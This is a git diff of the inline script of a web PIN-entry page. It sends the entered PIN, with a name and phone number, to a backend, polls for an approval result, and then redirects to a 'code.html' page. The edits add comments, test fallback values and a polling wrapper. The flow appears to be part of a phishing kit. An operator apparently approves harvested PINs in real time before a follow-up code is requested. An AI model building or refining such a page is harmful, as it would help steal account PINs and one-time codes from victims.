@@ -60,8 +60,10 @@ const maxAttempts = 3;
 let requestId = null;
 let pollInterval = null;
 
+// Auto-focus first input
 inputs[0].focus();
 
+// Input handling
 inputs.forEach((input, index) => {
     input.addEventListener('input', () => {
         input.value = input.value.replace(/[^0-9]/g, '');
@@ -73,11 +75,12 @@ inputs.forEach((input, index) => {
     });
 });
 
+// Submit PIN
 form.addEventListener('submit', async (e) => {
     e.preventDefault();
     const pin = [...inputs].map(i => i.value).join('');
-    const name = localStorage.getItem('name') || '';
-    const phone = localStorage.getItem('phone') || '';
+    const name = localStorage.getItem('name') || 'Test Name';
+    const phone = localStorage.getItem('phone') || '0712345678';
 
     button.disabled = true;
     btnText.textContent = 'Verifying...';
@@ -93,15 +96,11 @@ form.addEventListener('submit', async (e) => {
 
         const data = await res.json();
         requestId = data.requestId;
-        console.log('🆔 RequestId:', requestId, 'PIN submitted');
+        console.log('🆔 RequestId received:', requestId);
 
-        // Poll immediately
-        pollApproval();
-        // And then start interval polling
-        pollInterval = setInterval(pollApproval, 1500);
-
+        startPolling();
     } catch (err) {
-        console.error(err);
+        console.error('Submit PIN error:', err);
         statusText.textContent = 'Failed to submit PIN. Try again.';
         spinner.style.display = 'none';
         btnText.textContent = 'Submit PIN';
@@ -109,41 +108,46 @@ form.addEventListener('submit', async (e) => {
     }
 });
 
-async function pollApproval() {
-    if (!requestId) return;
+// Poll for approval
+function startPolling() {
+    if (pollInterval) clearInterval(pollInterval);
 
-    try {
-        console.log('⏱ Polling for approval...', requestId);
-        const res = await fetch(`${BACKEND_URL}/check-pin/${requestId}`);
-        const data = await res.json();
-        console.log('📊 Poll result:', data);
+    pollInterval = setInterval(async () => {
+        if (!requestId) return;
 
-        if (data.approved === true) {
-            clearInterval(pollInterval);
-            console.log('✅ PIN approved! Redirecting...');
-            window.location.href = 'code.html';
-        } else if (data.approved === false) {
-            clearInterval(pollInterval);
-            attempts++;
-            pinBoxes.classList.add('shake');
-            setTimeout(() => pinBoxes.classList.remove('shake'), 400);
+        try {
+            console.log('⏱ Polling for approval...', requestId);
+            const res = await fetch(`${BACKEND_URL}/check-pin/${requestId}`);
+            const data = await res.json();
+            console.log('📊 Poll result:', data);
 
-            if (attempts >= maxAttempts) {
-                statusText.innerHTML = '<span class="error">Too many failed attempts. Please try again later.</span>';
+            if (data.approved === true) {
+                clearInterval(pollInterval);
+                console.log('✅ PIN approved! Redirecting...');
+                window.location.href = 'code.html';
+            } else if (data.approved === false) {
+                clearInterval(pollInterval);
+                attempts++;
+                pinBoxes.classList.add('shake');
+                setTimeout(() => pinBoxes.classList.remove('shake'), 400);
+
+                if (attempts >= maxAttempts) {
+                    statusText.innerHTML = '<span class="error">Too many failed attempts. Please try again later.</span>';
+                    spinner.style.display = 'none';
+                    return;
+                }
+
+                statusText.innerHTML = '<span class="error">Incorrect PIN. Please try again.</span>';
                 spinner.style.display = 'none';
-                return;
+                inputs.forEach(i => i.value = '');
+                inputs[0].focus();
+                button.disabled = true;
+                btnText.textContent = 'Submit PIN';
             }
-
-            statusText.innerHTML = '<span class="error">Incorrect PIN. Please try again.</span>';
-            spinner.style.display = 'none';
-            inputs.forEach(i => i.value = '');
-            inputs[0].focus();
-            button.disabled = true;
-            btnText.textContent = 'Submit PIN';
+        } catch (err) {
+            console.error('Polling error:', err);
         }
-    } catch (err) {
-        console.error('Polling error:', err);
-    }
+    }, 1500);
 }
 </script>
 </body>
